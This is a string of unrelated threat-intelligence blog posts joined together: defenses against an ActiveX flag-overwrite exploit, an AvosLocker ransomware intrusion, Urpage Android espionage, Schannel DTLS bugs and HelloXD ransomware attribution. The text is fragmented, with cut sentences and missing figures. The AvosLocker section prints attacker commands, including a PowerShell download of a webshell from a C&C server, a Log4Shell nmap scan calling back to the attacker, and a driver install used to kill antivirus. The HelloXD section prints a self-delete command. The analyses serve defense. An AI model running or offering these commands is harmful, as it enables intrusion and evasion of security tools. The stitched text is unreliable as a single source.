"Following this code, another researcher posted his VB script version using more advanced techniques."
"Yu Yang then pasted his shellcode that used similar methods to run arbitrary code, showing that the method Yuki Chen used is exactly the one that won Yu the $100,000 award."
The main idea of new exploitation technique is to alter a flag that is used to control the security setting of an ActiveX object.
"If an attacker could modify it, then any script can be run, such as downloading and executing a PE file, without any notification or alert."
Further details were discussed in depth last month on Rapid7’s blog.
"The most interesting aspect of this method is that it could bypass all existing mitigation techniques including DEP/ASLR/EMET, and it also defeats some academic methods such as Control Flow Integrity (CFI)."
"So this raises another question: If there are no mitigation functions, do we have any other ways to defend against attacks similar to this?"
The first line of defense is the IPS.
"Although an attacker can use a variety of obfuscation techniques for HTML, we are still able to extract some features to create signatures."
"To address such an issue, we’ve created signatures 36442, 36468, and 36469 to provide coverage for the security flag overwrite."
"Although we are not aware of any attacks using this technique, these signatures have proven effective in our testing against code publicly available on the Internet. When we take a closer look at the three exploits in our blog post last month, we see that various exploit techniques are based on a singular condition, which is arbitrary memory access."
Only when attackers have the right to read/write any address can they utilize either Flash or ActiveX methods to get code execution.
"If we went even further, all three vulnerabilities are Use-After-Free bugs."
"The three vulnerabilities each contain code to alter a user-controlled address, and the code can be distilled down to the following operations:"
"Here, xyz indicates a user-controlled address that contains the length of a vector object or length of an Int32Array."
"Using these operations, attackers are able to modify the length values to create an object with an incorrect size, which will allow for read and write operations to occur in memory that is not part of the vector object."
"The attackers can then use this object to perform further operations such as modification of security flag in ActiveX. To prevent such attacks, a better idea is to detect if an arbitrary address is accessed during execution."
"In WildFire, we added modules for web browser scripts and third party plugins such as Flash."
"One such module leverages the fact that the length of a vector object is always consistent with memory allocation, which means we can deduce the memory usage from the sum of the length of all allocated vectors."
"If the calculated value does not match the real value, it indicates some of the vector objects may have been modified."
"Using this method, we are able to provide length checking for Flash vector objects."
This module validates the accessing behavior at runtime.
"If the length were suspicious, the detection module stops the malicious operation."
"Through our enterprise security platform, including IPS and WildFire, we continue to innovate and prevent advanced exploitation techniques."
Leave a comment below let us know what you think.
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot! By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
We found samples of AvosLocker ransomware that makes use of a legitimate driver file to disable antivirus solutions and detection evasion.
"While previous AvosLocker infections employ similar routines, this is the first sample we observed from the US with the capability to disable a defense solution using a legitimate Avast Anti-Rootkit Driver file (asWarPot.sys)."
"In addition, the ransomware is also capable of scanning multiple endpoints for the Log4j vulnerability Log4shell using Nmap NSE script."
"Infection chain Figure 1. AvosLocker infection chain According to our analysis, the suspected entry point is via the Zoho ManageEngine ADSelfService Plus (ADSS) exploit: Figure 2."
"The ADSS exploit abusing CVE-2021-40539 Due to the lack of network traffic details, we could not identify the exact CVE ID of the security gap the attacker used."
"However, there are some indications that they abused the same vulnerability previously documented by Synacktiv during a pentest, CVE-2021-40539."
"The gap we observed was particularly similar to the creation of JSP files (test.jsp), execution of keytool.exe with “null” parameters to run a crafted Java class/code."
Mapping the infection
The ADSS JAVA component (C:\ManageEngine\ADSelfService Plus\jre\bin\java.exe) executed mshta.exe to remotely run a remotely-hosted HTML application (HTA) file from the attackers’ command and control (C&C) server.
"Using Trend Micro™ Vision One™, we mapped out the processes that the infection performed to spawn the process."
Figure 3. Remotely executing an HTA file from the C&C server.
Screenshots taken from Trend Micro Vison One.
Figure 4. HTA file connecting to the C&C
A closer look at the HTA file revealed that the mshta.exe downloads and executes the remotely hosted HTA file.
"The HTA executed an obfuscated PowerShell script that contains a shellcode, capable of connecting back to the C&C server to execute arbitrary commands."
Figure 5.
Obfuscated PowerShell script contains a shellcode
The PowerShell process will download an ASPX webshell from the C&C server using the command < cmd.exe /c powershell -command Invoke-WebRequest -Uri hxxp://xx.xx.xx.xx/subshell.aspx -OutFile /ManageEngine/ADSelfService Plus/webapps/adssp/help/admin-guide >.
"According to Synacktiv’s research, with this command, the downloaded ASPX webshell is downloaded from a remote IP address and saved to the directory, and still accessible to the attacker."
"The attackers gathered system information using available tools such as whoami and systeminfo, as well as PowerShell commands."
Figure 6.
"Gather system information The code executes on the current domain controller to gather the username information, while the query user information gathers data about user sessions on a Remote Desktop Session Host server, name of the user, session ID, state of the session (either active or disconnected), idle time, date, and time the user logged on."
Figure 7. Executed with the /domain argument to collect username information Figure 8.
query user information for session data
"The PowerShell downloads, installs, and allows the remote desktop tool AnyDeskMSI through the firewall."
Figure 9. The PowerShell downloading and installing AnyDeskMSI
"We observed that a new user account was created, added to the current domain, and included in the administrator group."
This ensures the attacker can have administrative rights to the infected system.
The attackers also checked the running processes in the system via TaskList to check for antivirus processes running in the infiltrated system.
"Figure 10. Creating a new account with admin rights Figure 11. Checking for antivirus processes running During the scan, we observed an attempt to terminate security products initiated via TaskKill."
"Testing the sample with Trend Micro Vision One, the attempt failed as its sensors were still able to send activity data to the platform."
Figure 12.
Terminating security products running Tools and functions
Additional tools and components were copied to the compromised machine using AnyDeskMSI to scan the local network and disable security products.
The tools transferred using AnyDesk are: Netscan: To scan for other endpoints Nmap (log4shell.nse): To scan for Log4shell vulnerable endpoints Hacking tools Mimikatz and Impacket: For lateral movement PDQ deploy: For mass deployment of malicious script to multiple endpoints Aswarpot.sys: For disabling defense solutions.
"We noted that it can disable a number of antivirus products, previously identified by Aon’s researchers."
Figure 13. Copying tools and other malicious components to the compromised machine using AnyDesk
We found an Avast anti-rootkit driver installed as service 'asWarPot.sys' using the command sc.exe create aswSP_ArPot2 binPath= C:\windows\aswArPot.sys type= kernel.
It installs the driver file in preparation for disabling the running antivirus product.
We noted the unusual use of cmd.exe for execution of the file.
Figure 14.
Executing the anti-rootkit driver in the system
Mimikatz components were also copied to the affected machine via AnyDeskMSI.
"However, these components were detected and deleted."
Figure 15.
Detecting and deleting Mimikatz We observed the PowerShell script disabling the security products by leveraging aswarpot.sys (a legitimate Avast Anti-Rootkit Driver).
A list of security product processes was supplied and subsequently terminated by the driver. Figure 16.
Listing
and
terminating the security products found running in the compromised system
Verification: Manual replication of antivirus disabling routine
We manually replicated the routine and commands for disabling the defense solutions to further look into the routine.
Figure 17 shows the list of processes that the routine searches on infection : EndpointBasecamp.exe Trend Micro Endpoint Basecamp ResponseService.exe PccNTMon.exe SupportConnector.exe AOTAgent.exe CETASvc.exe CETASvc iVPAgent.exe tmwscsvc.exe TMResponse AOTAgentSvc TMBMServer iVPAgent Trend Micro Web Service Communicator Tmccsf Tmlisten Ntrtscan TmWSCSvc Figure 17.
"Searching for processes We found that aswArPot.sys, registered as aswSP_ArPot2 as a service, is used as the handle for the following DeviceIoControl call."
Figure 18.
Driver file preparing to disable an antivirus product The DeviceIoControl function is used to execute parts of the driver.
"In this case, the DeviceIoControl is inside a loop that iterates through the list of processes mentioned above."
"Additionally, we can see that 0x9988C094 is passed to DeviceIoControl as an argument simultaneous to the ID of the current process in the iteration."
Figure 19.
DeviceIoControl as an argument with the current process ID
"Inside aswArPot.sys, we saw 0x9988C094 in a switch case with a function sub_14001DC80 case."
"Inside function sub_14001DC80, we can see that that function has the capability to terminate a given process."
"Figure 20. 0x9988C094 in a switch case with sub_14001DC80 (above), with the latter value terminating a process (below)."
Other executions and lateral movement
"After disabling the security products, the actors behind AvosLocker again tried to transfer other tools, namely Mimikatz and Impacket."
Figure 21. Execution of Mimikatz (above) and Impacket via C:\temp\wmiexec.exe (below)
We also observed the execution of a password recovery tool XenArmor with C:\temp\pass\start.exe.
Figure 22. XenArmor password recovery tool execution
"We observed the attackers using an NMAP script to check for Log4shell, the Apache Log4j remote code execution (RCE, with ID CVE-2021-44228) vulnerability across the network."
"They used the command nmap --script log4shell.nse --script-args log4shell.waf-bypass=true --script-args log4shell.callback-server=xx.xx.xx.xx:1389 -p 80,443 xx.xx.xx.xx/xx, and set the callback server to the attacker group C&C server. Figure 23."
"Checking for log4shell We also observed more system network configuration discovery techniques being run, possibly for lateral movement as it tried looking for other available endpoints."
Figure 24. Running more system network configuration discovery scans
Deploying across the network We saw software deployment tool PDQ being used to deploy malicious batch scripts to multiple endpoints in the network.
Figure 25. Deploying malicious batch scripts to other endpoints The deployed batch script has the following commands: Disable Windows Update and Microsoft Defender Figure 26. Disable Microsoft defense services Prevents safeboot execution of security products Figure 27. Prevent security products’ execution Create new administrator account Figure 28. Create new account Add the AutoStart mechanism for the AvosLocker executable (update.exe) Figure 29. Add Autostart for ransomware executable Disables legal notice caption Figure 30. Disable legal notice Set safeboot with networking and disables Windows Error Recovery and reboot Figure 31. Setting and disabling network and specific Windows functions Conclusion
"While AvosLocker has been documented for its abuse of AnyDesk for lateral movement as its preferred application, we note that other remote access applications can also be abused to replace it."
"We think the same can be said for the software deployment tool, wherein the malicious actors can subsequently decide to replace and abuse it with other commercially available ones."
"In addition, aside from its availability, the decision to choose the specific rootkit driver file is for its capability to execute in kernel mode (therefore operating at a high privilege)."
"This variant is also capable of modifying other details of the installed security solutions, such as disabling the legal notice."
"Other modern ransomware, such as Mespinoza/Pysa, modify the registries of infected systems during their respective routines to inform their victims that they have been compromised."
"Similar to previously documented malware and ransomware groups, AvosLocker takes advantage of the different vulnerabilities that have yet to be patched to get into organizations’ networks."
"Once inside, the continuing trend of abusing legitimate tools and functions to mask malicious activities and actors’ presence"
grows in sophistication.
"In this case, the attackers were able to study and use Avast’s driver as part of their arsenal to disable other vendors’ security products."
"However, and specific to this instance, the attempt to kill an antivirus product such as this variant’s TaskKill can also be foiled."
"In this example using Trend Micro Vision One, the attempt was unsuccessful likely due to the product’s self-protection feature, which allowed the sensors to continue sending data and block the noted routine."
The visibility enabled by the platform allowed us as researchers to capture the extent of this ransomware’s attack chain and replicate the driver file being abused to verify its function during compromise.
"Avast responded to our notification with this statement: ""We can confirm the vulnerability in an old version of our driver aswArPot.sys, which we fixed in our Avast 21.5 released in June 2021."
"We also worked closely with Microsoft, so they released a block in the Windows operating system (10 and 11), so the old version of the Avast driver can't be loaded to memory."
"The below example shows that the blocking works (output from the ""sc start"" command):"
(SC) StartService FAILED 1275: This driver has been blocked from loading
"The update from Microsoft for the Windows operating system was published in February as an optional update, and in Microsoft's security release in April, so fully updated machines running Windows 10 and 11 are not vulnerable to this kind of attack."
"All consumer and business antivirus versions of Avast and AVG detect and block this AvosLocker ransomware variant, so our users are protected from this attack vector."
"For users of third-party antivirus software, to stay protected against this vulnerability, we recommend users to update their Windows operating system with the latest security updates, and to use a fully updated antivirus program."""
Indicators of Compromise (IOCs) File SHA256 Detection Malicious batch file component a5ad3355f55e1a15baefea83ce81d038531af516f47716018b1dedf04f081f15
Trojan
BAT.KILLAV.YACAA
AvosLocker executable 05ba2df0033e3cd5b987d66b6de545df439d338a20165c0ba96cde8a74e463e5 Ransom.Win32.AVOSLOCKER.SMYXBLNT Mimikatz executable (x32 and x64) 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9 HackTool.Win64.MIMIKATZ.ZTJA e81a8f8ad804c4d83869d7806a303ff04f31cce376c5df8aada2e9db2c1eeb98 HackTool.Win32.Mimikatz.CNFW Log4shell Nmap NSE script ddcb0e99f27e79d3536a15e0d51f7f33c38b2ae48677570f36f5e92863db5a96 Backdoor.Win32.CVE202144228.YACAH Impacket tool 14f0c4ce32821a7d25ea5e016ea26067d6615e3336c3baa854ea37a290a462a8 HackTool.Win32.Impacket.AA
"Tags Malware | Exploits & Vulnerabilities | Cyber Threats | APT & Targeted Attacks | Compliance & Risks | Endpoints | Ransomware | Network | Articles, News, Reports"
"In the process of monitoring changes in the threat landscape, we get a clearer insight into the way threat actors work behind the schemes."
"In this case we dig deeper into the possible connection between cyberattacks by focusing on the similarities an unnamed threat actor shares with Confucius, Patchwork, and another threat actor called Bahamut."
"For the sake of this report, we will call this unnamed threat actor “Urpage.”"
"What sets Urpage attacks apart is its targeting of InPage, a word processor for Urdu and Arabic languages."
"However, its Delphi backdoor component, which it has in common with Confucius and Patchwork, and its apparent use of Bahamut-like malware, is what makes it more intriguing as it connects Urpage to these other known threats."
"In our previous entry, we already covered the Delphi component in the context of the Confucius and Patchwork connection."
We mentioned Urpage as a third unnamed threat actor connected to the two.
"This time, we look into Urpage to gain a deeper insight into the way several threat actors' actions intersect."
The Bahamut Link Fake websites
The link between Bahamut and Urpage can be best discussed by way of the multiple malicious Android samples that matched Bahamut's code and had C&C belonging to the Urpage infrastructure.
Some of these C&C websites also act as phishing sites that lure users into downloading these very applications.
"The threat actor sets up these fake websites describing the application and linking to the Google Play Store to download it, like in the case of the malicious website, pikrpro[.]eu, seen below Another sample website involved the use of a closely copied version of an existing website, with slight changes in the logo and options above the page."
The download links were also replaced to download the malicious Android application instead.
Figure 1.
Original (top) and modified (bottom) website
"Upon writing this entry, we’ve coordinated with Google to ensure that the malicious applications these C&C sites advertise are no longer available for download on the Google Play Store."
"It is important to note however, that not all C&C websites for Urpage advertise malicious applications."
"Some simply contain a random template with empty categories, likely as a ploy to hide its malicious activities."
Android targeting
"As with Bahamut applications, once downloaded and executed, it showed multiple malicious features that deal with stealing information."
Some of these features are listed below.
"Retrieves basic information like network information and MAC address from an infected phone SMS stealing Contacts stealing Audio recording GPS location retrieval Steals files with the specific extensions, although not all samples target these extensions."
"File type File extensions Document files .txt, .csv, .doc, .docx, .xls, .xlsx, .pdf WhatsApp databases .db.crypt5 to .db.crypt12 Geolocation related files .kml, .kmz, .gmx, .aqm Audio files .mp3, .opus Videos .mp4, .amr, .wmv, .3gp, Pictures .jpeg, .jpg"
Of note is one specific application that had a different purpose from the others.
This application has the same encryption routine as other Urpage applications.
"Instead of stealing documents or images, it works on top of a modified version of the legitimate Threema, an end-to-end encrypted messaging application, to steal screenshots of messages."
This application has the same icon and label as the legitimate Threema.
"Once launched, it drops a modified APK version of Threema and prompts the user to install the application."
"The malicious application then hides its icon on the device but still runs in the background, while the modified Threema works like normal."
"Unknown to the user, the code in the modified Threema allows it to take screenshots of itself every 10 seconds."
"These images are stored in the location/sdcard/Android/data/ch.threema.app/DataData directory, while the “dropper” or the malicious application working in the background uploads the images to the C&C for the threat actor to access."
Figure 2. Comparison of legitimate Threema code (left) to the modified version (right) with the inserted code
Other activities
"Aside from acting as a C&C and distributing Bahamut-like malware, some of these websites also serve as the host for other malicious documents."
These other activities further establish the link of Urpage — and consequently Bahamut — to other threat actors.
"Take, for example, the previously mentioned pikrpro[.]eu."
This C&C website also acts as host not only for the malicious Android application but also for two other malicious documents listed here.
"A malicious RTF file that exploits the CVE-2017-8750 and drops a malicious VB backdoor with C&C appswonder[.]info A malicious InPage file that exploits CVE-2017-12824 and drops two files, one non-malicious, and one malicious VB backdoor with C&C referfile[.]com Talos recently reported both C&C domain names with one type of campaign that targets iOS and involves MDM, and another type using VB and Delphi backdoors."
This leads us back to the Confucius and Patchwork link.
The Confucius Link
"In our previous entry, we already discussed how Confucius used the same Delphi file stealer as Urpage."
"Digging into Urpage, we found another link—two malicious RTF files that exploit different vulnerabilities but download a similar script (detected as TROJ_POWLOAD.GAA) containing two base64-encoded URLs."
"One of the URLs is for the decoy document, while the other one is for the payload."
"One of the RTF files was found in a server related to Confucius (f1a54dca2fdfe59ec3f537148460364fb5d046c9b4e7db5fc819a9732ae0e063, detected as TROJ_CVE201711882.AG), while the other one (434d34c0502910c562f5c6840694737a2c82a8c44004fa58c7c457b08aac17bd,detected as Mal_CVE20170199-2) downloaded a VB Backdoor that pings back to twitck[.]com, a domain name belonging to Urpage."
"The Patchwork Link Patchwork also uses the Delphi file stealer as a similarity with Urpage, which suggests the three groups are somehow related."
"But this link is further fortified by the Android applications we found whose code is like that of Bahamut, with the C&C matching the usual name registration pattern of Patchwork’s group, as well as an infrastructure close to an old Patchwork domain."
"Patchwork has also recently employed Android malware in its attacks, with its use of a customized version of AndroRAT."
Summary
"The many similarities and connections show that threat actors do not work in isolation, and that attacks do not necessarily appear from out of nowhere."
This may even suggest that a single development team may be behind this attack — maybe a single paid group that has sold its tools and services to other groups with different goals and targets.
We’ve summarized all the mentioned findings in the table below.
"Urpage Bahamut Confucius Patchwork ""BioData"" Delphi backdoor and file stealer X X X VB backdoor X Android ""Bahamut-like"" malware X X X Custom Android malware X AndroRAT Android malware X InPage malicious documents X X simply obfuscated HTA downloaders X X IOS malware X Confucius malware X remote-access-c3 backdoor X Sneepy/Byebye shell malware X Python cloud filestealers X AllaKore RAT X Badnews malware X QuasarRAT X NDiskMonitor malware X Targets"
"We did not find Urpage victims in our telemetry, likely because of the targeted nature of these attacks."
"However, the domains used by Urpage provided hints about its target."
"For one, there is the domain pikrpro[.]eu and its subdomains—the islamicfinderfeedback[.]pikrpro[.]eu and the memrifilesforinfo[.]pikpro[.]eu."
"Additionally, many of the files related to the Urpage domains are auto-extractable files that drop Delphi or VB backdoor and open a decoy document."
"The decoy documents tell more about Urpage's possible targets, as it contains text from articles about the region of Kashmir."
The header for a sample document can be seen below.
"The documents can also be image files with the same theme, as can be seen here. Multiple Android applications further drive this notion, as they provide services based on the interests of users in that region."
"They have a malicious application that provides services for religion, as well as popular sports in the region."
Figure 3. Malicious application for observing Ramadan Figure 4.
"Malicious application for cricket news Solutions and Mitigation Taking note of these similarities and connections can help organizations and users in their continued defense against Urpage, Bahamut, Confucius, and Patchwork."
The connection of Urpage to the other three threat actors demonstrate that cyberattacks don’t exist in silos and that it hints at a circulation of knowledge and technologies that help in the continuing evolution of different malicious campaigns.
"Given this knowledge, organizations must be more vigilant in monitoring threats, as changes in one may mean that changes in others could follow."
Organizations can develop defenses against the social engineering component these four threat actors have in common.
Users should be able to identify the indicators of a social engineering campaign.
"Paying close attention to the domain name of a website before performing any further action can also help mitigate threats, including threats like Urpage that have targeted victims."
"As an additional defense against the growing use of malicious mobile applications, enterprises and end users can benefit from multilayered mobile security solutions such as Trend Micro™ Mobile Security for Android™ which is also available on Google Play."
Trend Micro’s Mobile App Reputation Service (MARS) covers Android and iOS threats using leading sandbox and machine learning technologies.
"It can protect users against malware, zero-day and known exploits, privacy leaks, and application vulnerability."
"For organizations, Trend Micro™ Mobile Security for Enterprise provides device, compliance and application management, data protection, and configuration provisioning."
"It also protects devices from attacks that leverage vulnerabilities, preventing unauthorized access to apps, as well as detecting and blocking malware and fraudulent websites."
"The Trend Micro™ Deep Discovery™ threat protection platform enables organizations to detect, analyze, and respond to modern threats such as sophisticated malware, targeted attacks, and APTs."
"Trend Micro™ Smart Protection for Endpoints with Maximum XGen™ security infuses high-fidelity machine learning into a blend of threat protection techniques to eliminate security gaps across user activity and any endpoint, offering the broadest possible protection against advanced attacks."
This appendix contains the latest Indicators of Compromise (IOCs) related to the different groups. Tags Mobile | APT & Targeted Attacks | Research
Microsoft recently released a patch for a critical vulnerability in Microsoft Secure Channel (aka Schannel).
This vulnerability is being referred to as MS14-066.
"The patch addressing CVE-2014-6321 fixed many areas within schannel.dll, including at least two vulnerabilities related to the handling of the Datagram Transport Layer Security (DTLS) protocol."
DTLS is used by Microsoft Remote Desktop Protocol (RDP) to provide communications privacy for datagram protocols.
The DTLS protocol is used by Microsoft Windows Remote Desktop Gateway (RDG) to establish a secure channel between the RDG client and RDG server (described in detail in [MS_TSGU].pdf). The RDG client initiates the DTLS connection by sending a ClientHello to the RDG Server. The RDG server then responds with a DTLS Hello Verify Request that contains a cookie; this is used as a denial of service countermeasure.
"The RDG client responds once again with a Client Hello packet containing the received cookie, which will initiate the DTLS handshake (RFC6347 Section 4.2). Figure 1: Initiation of the DTLS handshake between RDG client and server Figure 2: RDG client and server handshake phase (Source: [MS-TSGU] Section 1.3.3.1.1)"
"Before starting analysis, we needed to set up a test environment."
For the RDG server we referred to the following walkthrough: http://terrytlslau.tls1.cc/2014/01/deploying-remote-desktop-gateway-in.html.
Now let’s explore these vulnerabilities.
"When a client sends the DTLS ClientHello packet to the server, the server computes a Message Authentication Code (MAC) on it and compares it to the cookie contained in the packet."
"But the server only checks the cookie length field, not whether the cookie buffer can be read."
"In fact, a 32 byte length is always read, which could lead to a buffer out-of-bounds condition."
It should be noted that a client could send a crafted packet to the server without needing to start an RDP session.
"Figure 3, below, shows a packet crafted to display a “Cookie Length” of 32 (32 is equivalent to 0x20 in hexadecimal), which does not match the actual amount of data in the cookie (shown containing only two 0x41 characters)."
"Figure 3: A crafted packet sending mismatched size and content Related code is found in the DTLSCookieManager::ValidateCookie function: As shown above, although the server checks the “CookieSize” field, the compared length is always *(_DWORD *)(mgr + 16)), whose value is 0x20; however, the real cookie buffer length could be less than 0x20."
A crafted packet could set the “CookieSize” field to 0x20 and have the actual cookie buffer contain less than 0x20 bytes of data. When a DTLS client receives a HelloVerifyRequest packet with a CookieSize larger than 32 bytes the client does not properly validate the CookieSize value against the amount of cookie data in the packet.
This scenario can result in a heap overflow.
"It should be noted that if you want modify the “CookieSize“ value, you should modify the other length fields to keep the packet structure valid, as shown below in Figure 4."
Figure 4: An example of a properly modified DTLS packet cookie
"We can see the first packet is a normal ClientHello sent by the client, and the second packet is a crafted packet sent by the server. In order to examine exploitation of this vulnerability, we used WinDBG to attach to the lsass.exe process."
"Below, Figure 5 shows what the call stack looks like when the process crashes."
Figure 5: WinDBG view of call stack when lsass.exe process crashes due to exploitation Vulnerable code is found in the CSsl3TlsClientContext::DigestServerHelloVerifyRequest function: Palo Alto Networks is releasing signature 37094 and 37059 to defend against these vulnerabilities.
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
This post is also available in: 日本語 (Japanese) HelloXD is a ransomware family performing double extortion attacks that surfaced in November 2021.
During our research we observed multiple variants impacting Windows and Linux systems.
"Unlike other ransomware groups, this ransomware family doesn’t have an active leak site; instead it prefers to direct the impacted victim to negotiations through TOX chat and onion-based messenger instances."
"Unit 42 performed an in-depth analysis of the ransomware samples, the obfuscation and execution from this ransomware family, which contains very similar core functionality to the leaked Babuk/Babyk source code."
"It was also observed that one of the samples deployed MicroBackdoor, an open-source backdoor allowing an attacker to browse the file system, upload and download files, execute commands, and remove itself from the system."
We believe this was likely done to monitor the progress of the ransomware and maintain an additional foothold in compromised systems.
"During the analysis of the MicroBackdoor sample, Unit 42 observed the configuration and found an embedded IP address, belonging to a threat actor we believe is potentially the developer: x4k, also known as L4ckyguy, unKn0wn, unk0w, _unkn0wn and x4kme."
"Unit 42 has observed x4k in various hacking and non-hacking forums, which has linked the threat actor to additional malicious activity such as: Palo Alto Networks detects and prevents HelloXD and adjacent x4k activity with the following products and services: Cortex XDR and Next-Generation Firewalls (including cloud-delivered security subscriptions such as WildFire)."
"Due to the surge of this malicious activity, we’ve created this threat assessment for overall awareness."
HelloXD Malware Overview Packer Analyses Ransomware Internals WTFBBQ Pivots Hunting for Ransomware Attribution Conclusion Indicators of Compromise
Additional Resources
"HelloXD is a ransomware family first observed in the wild on Nov. 30, 2021."
This ransomware family uses a modified ClamAV logo in their executables.
ClamAV is an open-source antivirus engine used to detect malware.
"We also have observed additional samples with different versions of the logo, which led us to believe the ransomware developer may like using the ClamAV branding for their ransomware."
"Additionally, some of the observed samples include properties information that can be observed in Figure 1."
"The file description included the entry VlahmAV, a play on words on ClamAV, and the developer named the ransomware HelloXD and used another potential alias, uKnow, as the developer of HelloXD in the copyright section."
"When executed, HelloXD tries to disable shadow copies to inhibit system recovery before encrypting files using the following commands embedded in the sample: Additionally the ransomware does a ping to 1.1.1[.]1 and asks to wait a timeout of 3000 milliseconds between each reply, quickly followed with a delete command to delete the initial payload."
"cmd.exe /C ping 1.1.1[.]1 -n 1 -w 3000 > Nul & Del /f /q ""C:\Users\admin\Desktop\xd.exe"""
Two of the initial set of samples identified create a unique mutex containing the following message:
"After those commands are executed, the ransomware finishes by appending the file extension .hello, alongside a ransom note titled Hello.txt (Figure 2)."
The ransom note was modified between the observed samples.
"In the first sample we encountered (Figure 3, left), the ransom note only linked to a TOX ID, whereas a later observed sample (Figure 3, right) links to an onion domain as well as a TOX ID (different from the one in the first version)."
"At the time of writing, this site is down."
The ransomware creates an ID for the victim which has to be sent to the threat actor to make it possible to identify the victim and provide a decryptor.
The ransom note also instructs victims to download Tox and provides a Tox Chat ID to reach the threat actor.
Tox is a peer-to-peer instant messaging protocol that offers end-to-end encryption and has been observed being used by other ransomware groups for negotiations.
"For example, LockBit 2.0 leverages Tox Chat for threat actor communications."
"When observing both variants executing on virtual environments, we noted that the more recent variants changed the background to a ghost – a theme we’ve noticed in this threat actor’s work since our earliest observations of it."
"However, the previous version didn’t change the background at all – it simply left the ransom note we observed previously (Figure 4). During analysis and threat intel gathering, we discovered two main packers used for HelloXD ransomware binaries, as well as for other malware samples linked to the potential author (Figure 5)."
The first type of packer is a modified version of UPX.
"The code is extremely similar between UPX-packed binaries and the custom packer, however the custom packer avoids using identifiable section names such as .UPX0 and .UPX1, and leaves the default .text, .data, and .rsrc names unchanged."
"There are also no magic bytes within the packed payload, unlike UPX-packed binaries, which contain the magic bytes UPX!."
"However, a dead giveaway that the sample is packed is the raw size of the .text section, which is zeroed out, while the virtual size is much larger, as expected; this is identical to a .UPX0 section."
"As there is no data within the .text section on disk, the entry point of the unpacking stub is within the .data section, which will unpack the malicious code into the .text section on runtime."
"All of these details point toward the threat actor having modified or copied certain elements from the UPX packer, which can be further confirmed by comparing a UPX-packed binary with a custom-packed HelloXD binary."
"The second packer we discovered consists of two layers, with the second being the custom UPX packer discussed above."
"This particular packer seems to be more common on x64 binaries and involves decrypting embedded blobs using a seemingly custom algorithm containing unconventional instructions such as XLAT (Figure 6). Aside from storing the encrypted second layer, there is little to no obfuscation within the packer; API calls such as VirtualAlloc and VirtualProtect are clearly visible, and there is no control flow obfuscation."
"We have observed two different samples of the HelloXD ransomware publicly available, indicating it is still under development by the author(s)."
"The first sample is fairly rudimentary, with minimal obfuscation and typically paired with an obfuscated loader responsible for decrypting it through the use of the WinCrypt API before injecting it into memory."
"The second sample, on the other hand, is far more obfuscated, and is executed in memory by a packer rather than a full-scale loader."
"While the obfuscation and execution may differ between the two, both samples contain very similar core functionality, due to the author copying the leaked Babuk/Babyk source code in order to develop the HelloXD ransomware (Figure 7)."
"As a result, a lot of the function structure overlaps with Babuk, after getting past the obfuscation."
Table 1. Ransomware sample comparison summary.
"While there is a lot of overlap between HelloXD and Babuk, there are some small but crucial differences to take note of between Babuk and the two different variants. HelloXD version 1 is the least modified, utilizing Curve25519-Donna and a modified HC-128 algorithm to encrypt file data, while also containing the same CRC hashing routine incorporating the string dong, possibly referencing Chuong Dong, who had previously analyzed and reported on the first version of Babuk (Figure 8)."
"The HelloXD author(s) did modify the infamous file marker and mutex however, opting for dxunmgqehhehyrhtxywuhwrvzxqrcblo as the file marker and With best wishes And good intentions… as the mutex (Figure 9)."
"With HelloXD version 2, the author(s) opted to alter the encryption routine, swapping out the modified HC-128 algorithm with the Rabbit symmetric cipher."
"Additionally, the file marker changed again, this time to what seems to be random bytes rather than a coherent string."
"The mutex is also modified, set to nqldslhumipyuzjnatqucmuycqkxjon in one of the samples (Figure 10)."
"Both versions have been compiled with the same compiler (believed to be GCC 3.x and above based on the mangling of export names), resulting in very similar exports between not only the ransomware variants, but also other malware that we have linked to the potential author (Figure 11). The biggest difference between the versions is the interesting addition of a secondary payload embedded within version 2."
"This payload is encrypted using the WinCrypt API, in the same fashion as the obfuscated loader discussed above."
"Once decrypted, the payload is dropped to System32 with the name userlogin.exe before a service is created that points to it."
userlogin.exe is then executed (Figure 12).
"What is peculiar about this file is it is a variant of the open-source MicroBackdoor, a backdoor allowing an attacker to browse the file system, upload and download files, execute commands and remove itself from the system (Figure 13)."
"As the threat actor would normally have a foothold into the network prior to ransomware deployment, it raises the question of why this backdoor is part of the ransomware execution."
"One possibility is that it is used to monitor ransomed systems for blue team and incident response (IR) activity, though even in that case it is unusual to see offensive tools dropped at this point in the infection."
"While analyzing the ransomware binaries, we discovered a unique string prevalent in almost all of the samples: :wtfbbq (stored as UTF-16LE)."
"Querying VirusTotal with this string led to the discovery of eight files, six of which could be directly attributed to x4k through their own VirusTotal graph mapping out their infrastructure."
"The discovered samples are primarily Cobalt Strike Beacons, utilizing heavy control flow obfuscation – unlike the HelloXD ransomware samples we had previously seen."
"Unfortunately, this specific string is not completely unique to x4k, and is instead found on several GitHub repositories as part of a technique to allow a running executable to delete itself from disk through renaming primary data streams within the file to :wtfbbq."
"Running a search for the non-UTF-16LE string results in multiple files, and filtering for executables yields 10 results, the majority of which are NIM-based binaries – potentially linked to this GitHub repository."
"While the :wtfbbq string is not unique to x4k, by searching for the UTF-16LE version found inside the analyzed HelloXD ransomware samples, we only came across binaries linked to x4k’s infrastructure, providing a fairly strong link between HelloXD and x4k."
"The backdoor provided extremely useful insight into the potential threat actor behind the ransomware, as it had the following hardcoded IP address to use as the command and control (C2): 193[.]242[.]145[.]158."
"Upon navigating to this IP address, we observed an email address – tebya@poime[.]li – on the page title, the first link in the chain of attribution (Figure 14). Using the email address as a pivot, we identified additional domains that were linked to tebya@poime[.]li."
Table 2.
"Domains linked to tebya@poime.li Some of them historically resolved to some malicious IPs, which led us to discover additional infrastructure and malware being hosted in other domains (Table 3)."
Many of these also use the x4k name in the domain.
"Table 3. PDNS of 164[.]68[.]114[.]29 and 167[.]86[.]87[.]27 When looking at this infrastructure on VirusTotal, we observed that some of the domains we found were part of a VirusTotal graph called a.y.e/ created by the user x4k on June 30, 2021."
"On this graph, we found his infrastructure mapped out and malicious files that were also linked to the domains."
"This, however, was not the only graph we observed x4k creating."
"We also encountered additional graphs, mapping different things such as “Russian Hosts,” “DDoS Guard” and others, dating back to August 10, 2020 (Figure 15)."
"Additionally, we observed the initial email being linked to a GitHub account (Figure 16), as well as various forums including XSS, a known Russian-speaking hacking forum created to share knowledge about exploits, vulnerabilities, malware and network penetration."
